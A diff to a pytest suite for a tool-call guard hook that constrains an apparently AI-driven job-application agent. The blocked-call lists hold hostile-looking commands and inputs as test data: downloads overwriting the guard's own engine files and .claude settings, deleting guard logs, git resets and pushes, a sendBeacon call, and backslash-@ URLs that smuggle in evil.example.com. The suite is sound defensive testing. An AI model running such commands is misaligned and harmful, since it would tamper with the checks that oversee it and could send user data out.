@@ -18,9 +18,11 @@ def guard(sample):
     """guard(tool, **tool_input) -> (exit code, stderr), run against the sample workspace like Claude Code does."""
     (sample / "companies.md").write_text("| Beispiel | careers.beispiel-werke.de | | | |\n", encoding="utf-8")
 
-    def run(tool, session="s1", transcript=None, **tool_input):
+    def run(tool, session="s1", transcript=None, _agent=None, **tool_input):
         call = {"session_id": session, "cwd": str(sample), "hook_event_name": "PreToolUse", "tool_name": tool,
                 "tool_input": tool_input, "permission_mode": "auto", "transcript_path": str(transcript or "")}
+        if _agent:
+            call["agent_type"] = _agent
         r = subprocess.run([sys.executable, str(GUARD)], input=json.dumps(call), capture_output=True, text=True,
                            encoding="utf-8", env={**os.environ, "JOBHUNT_ROOT": str(sample)})
         return r.returncode, r.stderr
@@ -79,6 +81,33 @@ BLOCKED_CALLS = [
     ("mcp__obscura__browser_evaluate", {"expression": "location.href = 'https://x.example.com/'"}, "only read"),
     ("mcp__Claude_Browser__javascript_tool", {"text": "navigator.sendBeacon('https://x.example.com', d)"}, "read"),
     ("mcp__Claude_Browser__computer", {"action": "type", "text": "hello"}, "typing"),
+    ("Bash", {"command": "curl -s https://api.ashbyhq.com/x -o engine/tools/extract.py"}, "engine/"),
+    ("Bash", {"command": "wget -q -O engine/RULES.md https://api.ashbyhq.com/x"}, "engine/"),
+    ("PowerShell", {"command": "Invoke-WebRequest -Uri https://api.ashbyhq.com/x -OutFile .claude/settings.json"},
+     ".claude/"),
+    ("Write", {"file_path": "\\\\?\\{root}/engine/tools/x.py", "content": "x"}, "engine/ is read-only"),
+    ("Bash", {"command": "echo x >| engine/a.txt"}, "writes into engine/"),
+    ("PowerShell", {"command": "sc engine/RULES.md 'x'"}, "changes engine/"),
+    ("PowerShell", {"command": "ri .claude/settings.json"}, "changes .claude/"),
+    ("Bash", {"command": "cp notes.txt applications/../engine/tools/x.py"}, "engine/"),
+    ("Bash", {"command": "rm applications/../engine/RULES.md"}, "engine/"),
+    ("Bash", {"command": "git -C engine checkout HEAD~5 -- tools/hooks/guard.py"}, "engine/"),
+    ("Bash", {"command": "git -C engine reset --hard HEAD~1"}, "engine/"),
+    ("Bash", {"command": "git -C engine stash"}, "engine/"),
+    ("Bash", {"command": "python engine/tools/../../notes.py"}, "engine/tools"),
+    ("mcp__obscura__browser_evaluate", {"expression": "document.forms[0].requestSubmit()"}, "only read the page"),
+    ("Write", {"file_path": "data/guard.json", "content": "{}"}, "read-only"),
+    ("Edit", {"file_path": "data/guard.log", "old_string": "a", "new_string": "b"}, "read-only"),
+    ("Bash", {"command": "rm data/guard.log"}, "read-only"),
+    ("Bash", {"command": "echo '{}' > data/guard.json"}, "read-only"),
+    ("Bash", {"command": "git push origin main"}, "never pushes"),
+    ("Bash", {"command": "git -C . push"}, "never pushes"),
+    ("Bash", {"command": "git remote add backup https://example.org/x.git"}, "never pushes"),
+    ("PowerShell", {"command": "git remote set-url origin https://example.org/x.git"}, "never pushes"),
+    ("WebFetch", {"url": "https://rest.arbeitsagentur.de\\@evil.example.com/x", "prompt": "read"}, "backslash"),
+    ("Bash", {"command": "curl -s 'https://rest.arbeitsagentur.de\\@evil.example.com/x'"}, ""),
+    ("mcp__obscura__browser_navigate", {"url": "https://www.stepstone.de\\@evil.example.com/x"}, "backslash"),
+    ("WebSearch", {"query": "Lena Fischer lebenslauf"}, "search query"),
 ]
 
 
@@ -126,6 +155,18 @@ ALLOWED_CALLS = [
     ("mcp__claude_ai_Gmail__search_threads", {"query": "Bewerbung newer_than:1d"}),
     ("Agent", {"prompt": "never write to engine/ or send email; read the ad", "subagent_type": "general-purpose"}),
     ("Read", {"file_path": "engine/RULES.md"}),
+    ("Bash", {"command": "git -C engine show origin/main:UPGRADING.md"}),
+    ("Bash", {"command": "git -C engine worktree remove --force ../engine-new"}),
+    ("Bash", {"command": "git -C engine log --oneline -5 && git -C engine status --short"}),
+    ("Bash", {"command": "curl -s https://api.ashbyhq.com/posting-api/job-board/deepl -o data/ashby.json"}),
+    ("Bash", {"command": "cp engine/templates/application_template.md applications/../applications/X/application.md"}),
+    ("PowerShell", {"command": "Get-Content engine/RULES.md | Select-Object -First 5"}),
+    ("Bash", {"command": "git status --short"}),
+    ("Bash", {"command": "git log --oneline -5"}),
+    ("Bash", {"command": "cat data/guard.log"}),
+    ("Read", {"file_path": "data/guard.json"}),
+    ("WebSearch", {"query": "Werkstudent Marketing Mannheim Personio careers"}),
+    ("WebFetch", {"url": "https://rest.arbeitsagentur.de/a/b?x=1", "prompt": "read"}),
 ]
 
 
@@ -134,6 +175,24 @@ def test_allows(guard, tool, tool_input):
     tool_input = {k: v.replace("{root}", guard.root.as_posix()) if isinstance(v, str) else v
                   for k, v in tool_input.items()}
     assert guard(tool, **tool_input) == (0, "")
+
+
+BAD_CONFIGS = ["profile: just-a-string\n", "- a\n- list\n", "profile: [x, y]\n", "applicant: [Lena, Fischer]\n"]
+
+
+@pytest.mark.parametrize("text", BAD_CONFIGS)
+def test_a_malformed_config_does_not_switch_the_network_checks_off(guard, text):
+    (guard.root / "config.yaml").write_text(text, encoding="utf-8")
+    assert blocked(guard("Bash", command="curl -s https://evil.example.com/x"), "isn't an allowed API host")
+    assert blocked(guard("WebFetch", url="https://evil.example.com/", prompt="read"), "isn't an allowed API host")
+
+
+@pytest.mark.parametrize("text", ["[]", '"x"', "3", "null", "{broken"])
+def test_a_malformed_heartbeat_does_not_turn_a_block_into_a_pass(guard, text):
+    (guard.root / "data").mkdir(exist_ok=True)
+    (guard.root / "data" / "guard.json").write_text(text, encoding="utf-8")
+    assert blocked(guard("Bash", command="rm -rf engine/tools"), "changes engine/")
+    assert guard("Read", file_path="engine/RULES.md")[0] == 0
 
 
 def test_heartbeat_and_status(guard):
@@ -225,6 +284,15 @@ def test_own_errors_never_block(guard):
                        env={**os.environ, "JOBHUNT_ROOT": str(guard.root)})
     assert r.returncode == 0
     assert "error" in (guard.root / "data" / "guard.log").read_text(encoding="utf-8")
+
+
+def test_status_lists_the_guards_own_errors(guard):
+    call = {"session_id": "s1", "cwd": str(guard.root), "tool_name": "Bash", "tool_input": "x"}
+    r = subprocess.run([sys.executable, str(GUARD)], input=json.dumps(call), capture_output=True, text=True,
+                       env={**os.environ, "JOBHUNT_ROOT": str(guard.root)})
+    assert r.returncode == 0
+    out = run_status(guard.root).stdout
+    assert "guard errors: 1 call(s)" in out, out
 
 
 def test_launcher_runs_the_engine_guard_or_lets_calls_through(tmp_path):
@@ -393,3 +461,25 @@ NAVIGATION_URLS = [
 @pytest.mark.parametrize("url", NAVIGATION_URLS)
 def test_navigation_keeps_real_job_urls_working(nav, url):
     assert nav(url) is None, nav(url)
+
+
+@pytest.mark.parametrize("agent, tool, tool_input", [
+    ("ad-reader", "mcp__claude_ai_Gmail__search_threads", {"query": "Bewerbung"}),
+    ("ad-reader", "mcp__gmail__get_thread", {"id": "1"}),
+    ("mail-reader", "WebFetch", {"url": "https://rest.arbeitsagentur.de/x", "prompt": "read"}),
+    ("mail-reader", "WebSearch", {"query": "jobs"}),
+    ("mail-reader", "mcp__obscura__browser_navigate", {"url": "https://rest.arbeitsagentur.de/x"}),
+    ("mail-reader", "mcp__claude_ai_Indeed__search_jobs", {"query": "x"}),
+])
+def test_each_reader_keeps_to_its_tools(guard, agent, tool, tool_input):
+    assert blocked(guard(tool, _agent=agent, **tool_input), "reader")
+
+
+@pytest.mark.parametrize("agent, tool, tool_input", [
+    ("mail-reader", "mcp__claude_ai_Gmail__search_threads", {"query": "Bewerbung newer_than:1d"}),
+    ("mail-reader", "Read", {"file_path": "sources.md"}),
+    ("ad-reader", "mcp__claude_ai_Indeed__get_job_details", {"job_id": "abc"}),
+    (None, "mcp__claude_ai_Gmail__search_threads", {"query": "Bewerbung newer_than:1d"}),
+])
+def test_reader_rules_do_not_block_the_right_tools(guard, agent, tool, tool_input):
+    assert guard(tool, _agent=agent, **tool_input)[0] == 0
